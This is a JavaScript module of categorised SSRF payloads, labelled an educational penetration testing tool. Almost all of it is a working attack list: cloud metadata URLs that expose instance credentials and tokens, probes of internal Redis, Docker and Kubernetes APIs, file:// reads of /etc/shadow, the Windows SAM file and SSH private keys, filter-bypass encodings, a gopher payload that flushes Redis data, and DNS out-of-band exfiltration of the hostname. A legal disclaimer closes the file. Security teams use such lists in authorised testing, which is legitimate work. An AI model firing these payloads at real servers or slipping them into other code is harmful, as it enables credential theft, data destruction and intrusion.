// SSRF (Server-Side Request Forgery) Payload Generator - Educational Penetration Testing Tool
// WARNING: For authorized testing and educational purposes only

export const ssrfPayloads = {
  cloudMetadata: {
    name: 'Cloud Metadata Endpoints',
    description: 'Access cloud provider metadata services to extract instance credentials and configuration',
    category: 'Cloud Metadata',
    payloads: [
      {
        name: 'AWS IMDSv1 credentials',
        code: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
      },
      {
        name: 'AWS IMDSv1 user-data',
        code: 'http://169.254.169.254/latest/user-data'
      },
      {
        name: 'AWS IMDSv2 token request',
        code: 'http://169.254.169.254/latest/api/token'
      },
      {
        name: 'GCP metadata service',
        code: 'http://metadata.google.internal/computeMetadata/v1/'
      },
      {
        name: 'GCP service account token',
        code: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
      },
      {
        name: 'Azure metadata service',
        code: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
      },
      {
        name: 'Azure managed identity token',
        code: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
      },
      {
        name: 'DigitalOcean metadata',
        code: 'http://169.254.169.254/metadata/v1.json'
      }
    ]
  },
  localServices: {
    name: 'Internal Network Services',
    description: 'Access internal services and admin interfaces not exposed externally',
    category: 'Internal Services',
    payloads: [
      {
        name: 'Localhost web',
        code: 'http://localhost/'
      },
      {
        name: 'Localhost admin panel',
        code: 'http://127.0.0.1:8080/admin'
      },
      {
        name: 'Internal Redis (info)',
        code: 'dict://127.0.0.1:6379/info'
      },
      {
        name: 'Internal Memcached',
        code: 'dict://127.0.0.1:11211/stats'
      },
      {
        name: 'Internal Elasticsearch',
        code: 'http://127.0.0.1:9200/_cat/indices'
      },
      {
        name: 'Internal MongoDB',
        code: 'http://127.0.0.1:27017/'
      },
      {
        name: 'Internal Docker API',
        code: 'http://127.0.0.1:2375/v1.41/containers/json'
      },
      {
        name: 'Internal Kubernetes API',
        code: 'http://10.96.0.1/api/v1/namespaces'
      }
    ]
  },
  fileReadLFI: {
    name: 'Local File Read via File Protocol',
    description: 'Read local files using file:// URI scheme',
    category: 'File Read',
    payloads: [
      {
        name: '/etc/passwd (Linux)',
        code: 'file:///etc/passwd'
      },
      {
        name: '/etc/shadow (Linux)',
        code: 'file:///etc/shadow'
      },
      {
        name: '/etc/hosts',
        code: 'file:///etc/hosts'
      },
      {
        name: 'Windows SAM file',
        code: 'file:///C:/Windows/System32/config/SAM'
      },
      {
        name: 'Windows win.ini',
        code: 'file:///C:/Windows/win.ini'
      },
      {
        name: 'Apache access log',
        code: 'file:///var/log/apache2/access.log'
      },
      {
        name: 'SSH private key',
        code: 'file:///home/{USER}/.ssh/id_rsa'
      },
      {
        name: 'Application config',
        code: 'file:///var/www/html/config.php'
      }
    ]
  },
  bypassTechniques: {
    name: 'Filter Bypass Techniques',
    description: 'Bypass URL filters and allowlists used to protect against SSRF',
    category: 'Bypass Techniques',
    payloads: [
      {
        name: 'IPv6 localhost',
        code: 'http://[::1]/'
      },
      {
        name: 'Decimal IP (localhost)',
        code: 'http://2130706433/'
      },
      {
        name: 'Octal IP (localhost)',
        code: 'http://0177.0.0.1/'
      },
      {
        name: 'Hex IP (localhost)',
        code: 'http://0x7f000001/'
      },
      {
        name: 'URL with credentials',
        code: 'http://expected-host@127.0.0.1/'
      },
      {
        name: 'URL fragment bypass',
        code: 'http://127.0.0.1#@expected-host/'
      },
      {
        name: 'Double slash bypass',
        code: 'http://localhost//secure-page'
      },
      {
        name: 'URL-encoded dot',
        code: 'http://127%2E0%2E0%2E1/'
      }
    ]
  },
  protocols: {
    name: 'Alternative Protocol Schemes',
    description: 'Use alternative URL schemes to interact with internal services',
    category: 'Protocol Schemes',
    payloads: [
      {
        name: 'DICT protocol (info)',
        code: 'dict://127.0.0.1:11211/info'
      },
      {
        name: 'SFTP protocol',
        code: 'sftp://attacker.com:11111/'
      },
      {
        name: 'LDAP protocol',
        code: 'ldap://127.0.0.1:389/'
      },
      {
        name: 'Gopher Redis flush',
        code: 'gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A'
      },
      {
        name: 'Gopher HTTP request',
        code: 'gopher://127.0.0.1:80/_GET%20/%20HTTP/1.0%0D%0A%0D%0A'
      },
      {
        name: 'FTP protocol',
        code: 'ftp://127.0.0.1:21/'
      }
    ]
  },
  dns: {
    name: 'DNS Rebinding & Out-of-Band',
    description: 'DNS-based techniques including rebinding and out-of-band data exfiltration',
    category: 'DNS & OOB',
    payloads: [
      {
        name: 'DNS rebinding domain',
        code: 'http://{YOUR_COLLABORATOR_ID}.oastify.com/'
      },
      {
        name: 'Burp Collaborator SSRF probe',
        code: 'http://{YOUR_COLLABORATOR_ID}.burpcollaborator.net/'
      },
      {
        name: 'Subdomain DNS exfil',
        code: 'http://$(hostname).{YOUR_COLLABORATOR_ID}.oastify.com/'
      },
      {
        name: 'CNAME to localhost',
        code: 'http://localtest.me/'
      },
      {
        name: 'Wildcard DNS to 127.0.0.1',
        code: 'http://127.0.0.1.nip.io/'
      }
    ]
  }
}

export const quickProbes = [
  'http://169.254.169.254/latest/meta-data/',
  'http://127.0.0.1/',
  'http://localhost/',
  'file:///etc/passwd'
]

export const getAllCategories = () => {
  const categories = new Set()
  Object.values(ssrfPayloads).forEach(payload => {
    categories.add(payload.category)
  })
  return Array.from(categories).sort()
}

export const getPayloadsByCategory = (category) => {
  return Object.entries(ssrfPayloads).filter(
    ([, payload]) => payload.category === category
  )
}

export const disclaimer = `
⚠️  DISCLAIMER & LEGAL NOTICE ⚠️

SSRF (Server-Side Request Forgery) attacks can be extremely dangerous and result in:
• Unauthorized access to internal services and databases
• Exposure of cloud provider credentials and metadata
• Internal network reconnaissance and port scanning
• Remote code execution through internal service vulnerabilities
• Exfiltration of sensitive data and configuration files

This tool is for AUTHORIZED SECURITY TESTING & EDUCATIONAL PURPOSES ONLY.

Only use this tool if you:
✓ Have explicit written authorization from the system owner
✓ Are testing your own systems or systems you own
✓ Are in an authorized penetration testing engagement
✓ Understand the legal implications in your jurisdiction

Unauthorized SSRF attacks are ILLEGAL and may result in:
• Criminal prosecution
• Civil liability
• Imprisonment
• Significant fines

By using this tool, you acknowledge responsibility for your actions.
`
